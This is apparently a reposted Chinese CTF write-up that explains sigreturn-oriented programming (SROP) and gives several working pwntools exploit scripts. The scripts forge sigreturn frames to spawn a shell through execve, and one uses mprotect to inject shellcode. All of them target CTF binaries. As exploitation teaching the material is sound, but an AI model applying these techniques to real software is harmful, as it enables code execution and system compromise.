# 一道SROP漏洞利用的Pwn题

> 原文: https://www.ctfiot.com/90491.html
> ID: 90491

一

注意

SROP(Sigreturn Oriented Programming) 于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究Framing Signals — A Return to Portable Shellcode发表在安全顶级会议 Oakland 2014 上，被评选为当年的 Best Student Papers。

大家应该都看了很久的资料，其主要意思是通过系统调用来劫持程序流，先说几点要注意的：

1.系统调用是内核态所做的事情2.sigreturn是系统调用，调用号在64位下位15(也就是说在没有sigreturn系统调用地址的时候，只有rax=15且具有syscall才能进行sigreturn系统调用)3.在写exp的时候，需要写该程序的arch(context.log_level = "amd64")

二

题目详细介绍

有read和write系统调用，有栈溢出，可以通过write来泄露/bin/sh地址，这样就方便了很多。

这有gadgets，分别是sigreturn的系统调用号和execve的系统调用号。

顾名思义，就是泄露我们输入的数据在栈中的位置。

payload = "/bin/shx00"payload = payload.ljust(0x10,"x00")+p64(0x4004ed)p.send(payload)p.recv(0x20)binsh_addr = u64(p.recv(8))-280 # 0x00007fffffffde08 - 0x00007fffffffdcf0 = 280print "binsh_addr = " +hex(binsh_addr)

这是最重要的部分，所以会详细说。

frame = SigreturnFrame()frame.rax = 59 #constants.SYS_execveframe.rdi = binsh_addrframe.rsi = 0frame.rdx = 0frame.rip = 0x400501 #syscall

这就是构造的frame，当触发sigreturn系统调用后，rax=59，rdi=binsh_addr，rsi=0，rdx=0，rip=0x400501。

这样就知道了吧，sigreturn系统调用的作用就是恢复之前用户态寄存器的值。

payload = "/bin/shx00" + p64(0) + p64(0x4004DA) + p64(0x400501) + str(frame) #mov rax,15 = 0x4004DAp.send(payload)

传入payload之后，程序会执行0x4004DA，将rax赋值为15，然后执行0x400501即syscall，程序就会去栈中找到各个寄存器的值并pop到寄存器中，然后执行我们伪造的rip即syscall，达到getshell的目的。

这题只有一个read系统调用，这就需要我们去伪造一个sigreturn系统调用然后让其pop给各个寄存器我们伪造的值。

第一步在frame中构造栈迁移和read系统调用。

frame = SigreturnFrame() #伪造frame.rax = 0frame.rdi = 0frame.rsi = 0x402500frame.rdx = 0x300frame.rip = 0x40102Bframe.rsp = 0x402500frame.rbp = 0x402500 payload = "a"*0x18 + p64(vuln) + p64(0x40102B) + str(frame) # syscall = 0x40102Bp.send(payload)p.sendline("a"*14) #

传入payload之后，程序执行vuln即重新执行read调用，我们输入14个a之后(我用的sendline，在最后一个a后会有换行符，所以相当于输入15个)，rax=15，然后这时候填入栈中的0x40102B就进行了系统调用，pop出各个寄存器的值。此时rip是syscall，rax=0即调用read系统调用。

frame = SigreturnFrame()frame.rax = 59frame.rdi = 0x402500frame.rip = 0x40102Bframe.rsi = 0frame.rdx = 0 payload = "x00"*8 + p64(vuln) + p64(0x40102b) + str(frame)p.sendline(payload)p.send("q"*8+"/bin/sh") p.interactive()

payload前八位是”x00″，因为执行完syscall(0x40102B)，后续会pop rbp，然后ret回vuln函数再进行read系统调用，这个”q”*8是使rax=15，并且使/bin/sh正好在0x402500处。

这题与上题的区别就是，我们需要自己构造rax麻烦一点。

这题很经典，我看了大概好几个月，这几个月中看了好几遍，有一个地方一直不太通，今天上午问了漫牛老师，终于明白了，漫牛老师yyds，同时感谢我最爱的琪giegie。

下面给出三种exp。

from pwn import *context.log_level = "debug"p = process("./smallest")context.arch = "amd64"def g(): gdb.attach(p) input() syscall = 0x4000BEmain = 0x4000B0 payload1 = p64(main)*3p.send(payload1) p.send("xB3") #rax = 1stack_addr = u64(p.recv()[8:16])success("stack_addr:"+hex(stack_addr)) frame = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = stack_addrframe.rdx = 0x300frame.rsp = stack_addrframe.rip = syscall payload2 = p64(main) + p64(0) + str(frame)p.send(payload2) p.send(p64(syscall)+"a"*7) #rax = 15 frame = SigreturnFrame()frame.rax = 59frame.rdi = stack_addr+0x200 # /bin/shframe.rsi = 0frame.rdx = 0frame.rsp = stack_addrframe.rip = syscall payload3 = p64(main) + p64(0) + str(frame) payload3 = payload3 + (0x200-len(payload3))*"a"+"/bin/shx00"p.send(payload3) p.send(p64(syscall)+"a"*7) p.interactive()

我画个图，这样比较好解释。

from pwn import *context.log_level = "debug"p = process("./smallest")context.arch = "amd64"def g(): gdb.attach(p) input() syscall = 0x4000BEmain = 0x4000B0ret = 0x4000C0 payload1 = p64(main)*3p.send(payload1) p.send("xB3") #rax = 1stack_addr = u64(p.recv()[8:16])success("stack_addr:"+hex(stack_addr)) frame = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = stack_addrframe.rdx = 0x300frame.rsp = stack_addrframe.rip = syscall payload2 = p64(main) + p64(0) + p64(0) + str(frame) ############## herep.send(payload2) p.send(p64(ret)+"xBEx00x40x00x00x00x00") #rax = 15 here frame = SigreturnFrame()frame.rax = 59frame.rdi = stack_addr+0x200 # /bin/shframe.rsi = 0frame.rdx = 0frame.rsp = stack_addr frame.rip = syscall payload3 = p64(main) + p64(0) + p64(0) + str(frame) payload3 = payload3 + (0x200-len(payload3))*"a"+"/bin/shx00"p.send(payload3) p.send(p64(ret)+"xBEx00x40x00x00x00x00") p.interactive()

思路是利用mprotect修改text段权限，传入shellcode。

from pwn import *context.log_level = "debug"p = process("./smallest")context.arch = "amd64" main = 0x4000B0syscall = 0x4000BEret = 0x4000C0
def g(): gdb.attach(p) input() frame = SigreturnFrame()frame.rax = constants.SYS_mprotect #10frame.rdi = 0x400000frame.rsi = 0x1000frame.rdx = 7frame.rsp = 0x400128frame.rip = syscall payload1 = p64(main) + p64(0) + str(frame)p.send(payload1) p.send(p64(syscall) + "a"*7) #rax = 15#mprotect finished shellcode = asm('''mov rax,59mov rdi,0x68732f6e69622fxor rsi,rsixor rdx,rdxpush rdimov rdi,rspsyscall''')payload = p64(0x400138) + shellcode p.send(payload) p.interactive()

看雪ID：e*16 a

https://bbs.kanxue.com/user-home-922338.htm

*本文由看雪论坛 e*16 a 原创，转载请注明来自看雪社区

# 往期推荐

1.CVE-2022-21882提权漏洞学习笔记

2.wibu证书 – 初探

3.win10 1909逆向之APIC中断和实验

4.EMET下EAF机制分析以及模拟实现

5.sql注入学习分享

6.V8 Array.prototype.concat函数出现过的issues和他们的POC们

球分享

球点赞

球在看

点击“阅读原文”，了解更多！


```
一
注意
1.系统调用是内核态所做的事情2.sigreturn是系统调用，调用号在64位下位15(也就是说在没有sigreturn系统调用地址的时候，只有rax=15且具有syscall才能进行sigreturn系统调用)3.在写exp的时候，需要写该程序的arch(context.log_level = "amd64")
二
题目详细介绍
payload = "/bin/shx00"payload = payload.ljust(0x10,"x00")+p64(0x4004ed)p.send(payload)p.recv(0x20)binsh_addr = u64(p.recv(8))-280 # 0x00007fffffffde08 - 0x00007fffffffdcf0 = 280print "binsh_addr = " +hex(binsh_addr)
frame = SigreturnFrame()frame.rax = 59 #constants.SYS_execveframe.rdi = binsh_addrframe.rsi = 0frame.rdx = 0frame.rip = 0x400501 #syscall
payload = "/bin/shx00" + p64(0) + p64(0x4004DA) + p64(0x400501) + str(frame) #mov rax,15 = 0x4004DAp.send(payload)
frame = SigreturnFrame() #伪造frame.rax = 0frame.rdi = 0frame.rsi = 0x402500frame.rdx = 0x300frame.rip = 0x40102Bframe.rsp = 0x402500frame.rbp = 0x402500 payload = "a"*0x18 + p64(vuln) + p64(0x40102B) + str(frame) # syscall = 0x40102Bp.send(payload)p.sendline("a"*14) #
frame = SigreturnFrame()frame.rax = 59frame.rdi = 0x402500frame.rip = 0x40102Bframe.rsi = 0frame.rdx = 0 payload = "x00"*8 + p64(vuln) + p64(0x40102b) + str(frame)p.sendline(payload)p.send("q"*8+"/bin/sh") p.interactive()
from pwn import *context.log_level = "debug"p = process("./smallest")context.arch = "amd64"def g(): gdb.attach(p) input() syscall = 0x4000BEmain = 0x4000B0 payload1 = p64(main)*3p.send(payload1) p.send("xB3") #rax = 1stack_addr = u64(p.recv()[8:16])success("stack_addr:"+hex(stack_addr)) frame = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = stack_addrframe.rdx = 0x300frame.rsp = stack_addrframe.rip = syscall payload2 = p64(main) + p64(0) + str(frame)p.send(payload2) p.send(p64(syscall)+"a"*7) #rax = 15 frame = SigreturnFrame()frame.rax = 59frame.rdi = stack_addr+0x200 # /bin/shframe.rsi = 0frame.rdx = 0frame.rsp = stack_addrframe.rip = syscall payload3 = p64(main) + p64(0) + str(frame) payload3 = payload3 + (0x200-len(payload3))*"a"+"/bin/shx00"p.send(payload3) p.send(p64(syscall)+"a"*7) p.interactive()
from pwn import *context.log_level = "debug"p = process("./smallest")context.arch = "amd64"def g(): gdb.attach(p) input() syscall = 0x4000BEmain = 0x4000B0ret = 0x4000C0 payload1 = p64(main)*3p.send(payload1) p.send("xB3") #rax = 1stack_addr = u64(p.recv()[8:16])success("stack_addr:"+hex(stack_addr)) frame = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = stack_addrframe.rdx = 0x300frame.rsp = stack_addrframe.rip = syscall payload2 = p64(main) + p64(0) + p64(0) + str(frame) ############## herep.send(payload2) p.send(p64(ret)+"xBEx00x40x00x00x00x00") #rax = 15 here frame = SigreturnFrame()frame.rax = 59frame.rdi = stack_addr+0x200 # /bin/shframe.rsi = 0frame.rdx = 0frame.rsp = stack_addr frame.rip = syscall payload3 = p64(main) + p64(0) + p64(0) + str(frame) payload3 = payload3 + (0x200-len(payload3))*"a"+"/bin/shx00"p.send(payload3) p.send(p64(ret)+"xBEx00x40x00x00x00x00") p.interactive()
from pwn import *context.log_level = "debug"p = process("./smallest")context.arch = "amd64" main = 0x4000B0syscall = 0x4000BEret = 0x4000C0
def g(): gdb.attach(p) input() frame = SigreturnFrame()frame.rax = constants.SYS_mprotect #10frame.rdi = 0x400000frame.rsi = 0x1000frame.rdx = 7frame.rsp = 0x400128frame.rip = syscall payload1 = p64(main) + p64(0) + str(frame)p.send(payload1) p.send(p64(syscall) + "a"*7) #rax = 15#mprotect finished shellcode = asm('''mov rax,59mov rdi,0x68732f6e69622fxor rsi,rsixor rdx,rdxpush rdimov rdi,rspsyscall''')payload = p64(0x400138) + shellcode p.send(payload) p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1673082976.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/5-1673082977.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1673082977.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1673082978.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1673082978.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1673082979.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/10-1673082979.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/4-1673082979.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1673082980.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/10-1673082980.gif)